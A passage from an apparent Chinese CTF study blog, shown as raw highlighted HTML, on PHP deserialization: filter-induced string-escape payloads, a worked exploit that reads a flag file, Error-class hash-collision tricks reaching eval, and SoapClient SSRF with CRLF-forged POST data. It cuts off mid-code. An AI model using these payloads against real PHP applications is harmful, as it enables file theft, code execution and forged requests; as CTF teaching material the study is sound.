class="string">&#x27;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;sadasd&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$profile</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$profile</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;过滤后:&quot;</span>,<span class="variable">$serialize_info</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;反序列化后：&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>));</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span>(<span class="number">320</span>) <span class="string">&quot;a:4:&#123;s:5:&quot;</span>phone<span class="string">&quot;;s:11:&quot;</span><span class="number">12345678901</span><span class="string">&quot;;s:5:&quot;</span>email<span class="string">&quot;;s:16:&quot;</span><span class="number">734541725</span>@qq.com<span class="string">&quot;;s:8:&quot;</span>nickname<span class="string">&quot;;s:198:&quot;</span>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class="string">&quot;;s:5:&quot;</span>photo<span class="string">&quot;;s:10:&quot;</span>config.php<span class="string">&quot;;&#125;&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;sadasd&quot;</span>;&#125;<span class="string">&quot;</span></span><br><span class="line"><span class="string">过滤后:a:4:&#123;s:5:&quot;</span>phone<span class="string">&quot;;s:11:&quot;</span><span class="number">12345678901</span><span class="string">&quot;;s:5:&quot;</span>email<span class="string">&quot;;s:16:&quot;</span><span class="number">734541725</span>@qq.com<span class="string">&quot;;s:8:&quot;</span>nickname<span class="string">&quot;;s:198:&quot;</span>hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker<span class="string">&quot;;s:5:&quot;</span>photo<span class="string">&quot;;s:10:&quot;</span>config.php<span class="string">&quot;;&#125;&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;sadasd&quot;</span>;&#125;</span><br><span class="line">反序列化后：E:\浏览器下载\chrome\新建文件夹\<span class="number">2</span>.php:<span class="number">21</span>:</span><br><span class="line"><span class="keyword">array</span>(<span class="number">4</span>) &#123;</span><br><span class="line">  <span class="string">&#x27;phone&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">11</span>) <span class="string">&quot;12345678901&quot;</span></span><br><span class="line">  <span class="string">&#x27;email&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">16</span>) <span class="string">&quot;734541725@qq.com&quot;</span></span><br><span class="line">  <span class="string">&#x27;nickname&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">198</span>) <span class="string">&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;</span></span><br><span class="line">  <span class="string">&#x27;photo&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">10</span>) <span class="string">&quot;config.php&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里还要注意的点就是因为要绕过正则，所以nickname→nickname[]，数组序列化后就需要闭合{，所以</p><p><code>nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code></p><p>34个where，并且需要手动添加一个}来闭合多出的{</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>[]=<span class="keyword">array</span>(<span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line">&gt;&gt;</span><br><span class="line"><span class="keyword">string</span>(<span class="number">24</span>) <span class="string">&quot;a:1:&#123;i:0;a:1:&#123;i:0;i:1;&#125;&#125;&quot;</span></span><br></pre></td></tr></table></figure><img src="../images/image-20221004202925741.png" alt="image-20221004202925741" style="zoom: 50%;" /><h3 id="过滤后字符变少"><a href="#过滤后字符变少" class="headerlink" title="过滤后字符变少"></a>过滤后字符变少</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">思路：过滤后字符减少，会吃掉后面的字符，所以需要计算过滤处到目标子串的长度</span><br><span class="line">见下面例子，因为这种情况需要观察序列化字符串才能得到过滤处到目标子串的长度，而不是像过滤后字符变多那样可以直接构造。</span><br></pre></td></tr></table></figure><h4 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h4><p>过滤函数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可控变量</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line">还有一个<span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>]是需要我们覆盖的变量</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br></pre></td></tr></table></figure><p>序列化→过滤→反序列化</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"><span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br></pre></td></tr></table></figure><p>目标子串</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">base64_encode</span>(d0g3_f1ag.php)=<span class="string">&#x27;ZDBnM19mMWFnLnBocA==&#x27;</span></span><br><span class="line"><span class="string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>观察序列化字符串</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;<span class="comment">//过滤后字符减少3或者4</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;function&quot;</span>] = <span class="string">&#x27;&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="string">&#x27;Z3Vlc3RfaW1nLnBuZw==&#x27;</span>;<span class="comment">//不可控变量，固定值base64_encode(&#x27;guest_img.png&#x27;)</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">echo</span>  <span class="string">&quot;过滤前:&quot;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>),<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;过滤后:&quot;</span>,<span class="variable">$serialize_info</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">&gt;&gt;</span><br><span class="line">过滤前:</span><br><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;flag&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;</span><br><span class="line">s:<span class="number">41</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;<span class="string">&quot;;</span></span><br><span class="line"><span class="string">s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>Z3Vlc3RfaW1nLnBuZw==<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">过滤后:</span></span><br><span class="line"><span class="string">a:3:&#123;s:4:&quot;</span>user<span class="string">&quot;;s:4:&quot;</span><span class="string">&quot;;s:8:&quot;</span><span class="function"><span class="keyword">function</span>&quot;</span>;s:<span class="number">41</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>Z3Vlc3RfaW1nLnBuZw==<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">需要计算过滤处到目标子串的长度：&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">41</span>:<span class="string">&quot; 长度为23，不为3或4的倍数，最接近的是24，所以在</span></span><br><span class="line"><span class="string">目标子串头添加任意一个字符变成a&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;</span><br><span class="line">所以过滤后会吃掉<span class="number">24</span>个字符，所以可以选择<span class="number">4</span>*<span class="number">6</span>或者<span class="number">3</span>*<span class="number">8</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;<span class="comment">//过滤后字符减少</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>]=<span class="string">&#x27;flagflagflagflagflagflag&#x27;</span>;<span class="comment">//过滤后向后吃24个字符，或者php*8</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;function&quot;</span>]=<span class="string">&#x27;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:4:&quot;khaz&quot;;s:4:&quot;haha&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="string">&#x27;Z3Vlc3RfaW1nLnBuZw==&#x27;</span>;<span class="comment">//不可控变量，固定值</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>  <span class="string">&quot;过滤前:&quot;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>),<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;过滤后:&quot;</span>,<span class="variable">$serialize_info</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;</span><br><span class="line"></span><br><span class="line">过滤前:</span><br><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">24</span>:<span class="string">&quot;flagflagflagflagflagflag&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">64</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;khaz&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;haha&quot;</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>Z3Vlc3RfaW1nLnBuZw==<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">过滤后:</span></span><br><span class="line"><span class="string">a:3:&#123;s:4:&quot;</span>user<span class="string">&quot;;s:24:&quot;</span><span class="string">&quot;;s:8:&quot;</span><span class="function"><span class="keyword">function</span>&quot;</span>;s:<span class="number">64</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;khaz&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;haha&quot;</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>Z3Vlc3RfaW1nLnBuZw==<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">E:\xampp2\php\www\2.php:19:</span></span><br><span class="line"><span class="string">array(3) &#123;</span></span><br><span class="line"><span class="string">  &#x27;user&#x27; =&gt;</span></span><br><span class="line"><span class="string">  string(24) &quot;</span><span class="string">&quot;;s:8:&quot;</span><span class="function"><span class="keyword">function</span>&quot;</span>;s:<span class="number">64</span>:<span class="string">&quot;a&quot;</span></span><br><span class="line">  <span class="string">&#x27;img&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">20</span>) <span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span></span><br><span class="line">  <span class="string">&#x27;khaz&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;haha&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">s:<span class="number">4</span>:<span class="string">&quot;khaz&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;haha&quot;</span>;添加了这个是因为<span class="variable">$_SESSION</span>有三个值(a:<span class="number">3</span>),数量要对的上才能反序列化</span><br><span class="line">s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">24</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">64</span>:<span class="string">&quot;a&quot;</span>;</span><br><span class="line">s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;</span><br><span class="line">s:<span class="number">4</span>:<span class="string">&quot;khaz&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;haha&quot;</span>;</span><br></pre></td></tr></table></figure><h1 id="原生类利用"><a href="#原生类利用" class="headerlink" title="原生类利用"></a>原生类利用</h1><h2 id="常见场景"><a href="#常见场景" class="headerlink" title="常见场景"></a>常见场景</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">key</span>(<span class="variable">$this</span>-&gt;value);</span><br></pre></td></tr></table></figure><h2 id="获取指定方法的原生类"><a href="#获取指定方法的原生类" class="headerlink" title="获取指定方法的原生类"></a>获取指定方法的原生类</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$classes</span> = <span class="title function_ invoke__">get_declared_classes</span>(); <span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) &#123;</span><br><span class="line">    <span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$class</span>); <span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="keyword">array</span>( <span class="string">&#x27;__destruct&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;__toString&#x27;</span>, <span class="string">&#x27;__wakeup&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;__call&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;__callStatic&#x27;</span>, <span class="string">&#x27;__get&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;__set&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;__isset&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;__unset&#x27;</span>, <span class="string">&#x27;__invoke&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;__set_state&#x27;</span></span><br><span class="line">        ))) &#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="variable">$class</span> . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$method</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>可以根据题目环境将指定的方法添加进来, 来遍历存在指定方法的原生类</p><p>比如说题目给的代码有MD5，eval等，这些函数的参数都是字符串类型，所以可以触发<code>__tostring</code>魔术方法</p></blockquote><h2 id="Error-x2F-Exception-类"><a href="#Error-x2F-Exception-类" class="headerlink" title="Error&#x2F;Exception 类"></a>Error&#x2F;Exception 类</h2><blockquote><p>用于自定义错误类型的</p></blockquote><table><thead><tr><th align="center">类</th><th align="center">适用版本</th><th align="center">属性（一样的）</th></tr></thead><tbody><tr><td align="center">Error</td><td align="center">php7</td><td align="center">message：异常消息内容                                                           file：抛出异常的文件名</td></tr><tr><td align="center">Exception</td><td align="center">php5&#x2F;php7</td><td align="center">line：抛出异常在该文件中的行号                                         code：异常代码</td></tr></tbody></table><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\r\n\r\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt;&gt;</span><br><span class="line"><span class="built_in">Error</span>: payload in D:\phpstudy_pro\phpstudy_pro\WWW\test\<span class="number">1</span>.php:<span class="number">2</span></span><br><span class="line">Stack trace:</span><br><span class="line"><span class="comment">#0 &#123;main&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Error</span>: payload in D:\phpstudy_pro\phpstudy_pro\WWW\test\<span class="number">1</span>.php:<span class="number">3</span></span><br><span class="line">Stack trace:</span><br><span class="line"><span class="comment">#0 &#123;main&#125;</span></span><br></pre></td></tr></table></figure><p>仔细观察会发现只有异常代码code没有被输出，并且只有行号line不同</p><p>利用</p><blockquote><p>可用来绕过类属性的哈希比较</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);<span class="variable">$b</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;md5($a)=&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;md5($b)=&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;sha1($a)=&#x27;</span>.<span class="title function_ invoke__">sha1</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;sha1($b)=&#x27;</span>.<span class="title function_ invoke__">sha1</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>===<span class="variable">$b</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;相同&#x27;</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;不相同&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220807151831343.png" alt="image-20220807151831343"></p><blockquote><p>值不相同（对象，异常代码不同）,md5和sha1的值相同（输出的是一样的）</p></blockquote><h3 id="极客大挑战-2020-Greatphp"><a href="#极客大挑战-2020-Greatphp" class="headerlink" title="[极客大挑战 2020]Greatphp"></a>[极客大挑战 2020]Greatphp</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;syc != <span class="variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;syc) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;syc)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;lover)) )</span><br><span class="line">    </span><br><span class="line"><span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;syc);</span><br></pre></td></tr></table></figure><p>多了一个eval</p><p>只需要将payload构造为<code>?&gt;&lt;? payload?&gt;</code>的形式即可,前面的<code>?&gt;</code>把文件原来的<code>&lt;?php</code>闭合了。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>( <span class="meta">?&gt;</span>    <span class="meta">&lt;?php</span> payload <span class="meta">?&gt;</span>        )    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="SoapClient类"><a href="#SoapClient类" class="headerlink" title="SoapClient类"></a>SoapClient类</h2><blockquote><p>内置call方法，当call方法被调用时，就会发起http请求，可以伪造ssrf请求</p><p>并因为可以自定义user_agent请求头从而造成crlf漏洞。</p></blockquote><p>可能会出现的问题<a href="https://stackoverflow.com/questions/11391442/fatal-error-class-soapclient-not-found">Fatal error: Uncaught Error: Class ‘SoapClient’ not found in</a></p><blockquote><p>CRLF注入是一类注入漏洞。是“回车+换行”的简称，又叫做回车换行符。<br>表示为<code>\r\n</code>，编码之后是<code>%0d%0a</code>。这个在HTTP协议中表示消息头与消息体之间的分隔。</p><p>浏览器就是根据这两个CRLF来分离HTTPHeader与HTTPBody的。从而把HTTP内容显示出来。所以，如果我们能够控制HTTP消息头的字符，那么我们就能够注入一些恶意的换行。</p></blockquote><p>例子SoapClient::call方法发送soap请求,伪造post数据</p><p>在linux下执行</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&quot;http://192.168.244.128:8888/&quot;</span>;</span><br><span class="line"><span class="variable">$post_string</span> = <span class="string">&#x27;data=abc&#x27;</span>;</span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,</span><br><span class="line"><span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,</span><br><span class="line">  <span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;khaz^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.<span class="title function_ invoke__">join</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="variable">$headers</span>).<span class="string">&#x27;^^Content-Length: &#x27;</span>. (<span class="keyword">string</span>)<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_string</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_string</span>,</span><br><span class="line">        <span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;hello&#x27;</span>));</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_replace</span>(<span 